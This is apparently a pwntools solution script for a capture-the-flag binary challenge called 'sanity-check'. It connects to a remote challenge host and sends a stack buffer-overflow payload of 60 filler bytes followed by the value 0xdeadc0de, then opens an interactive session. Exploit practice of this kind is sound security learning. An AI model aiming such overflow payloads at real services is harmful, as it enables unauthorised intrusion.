from pwn import *

r = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)
r.recvline()

p = 'a'*60+p64(3735929054)

r.send(p)
r.interactive()
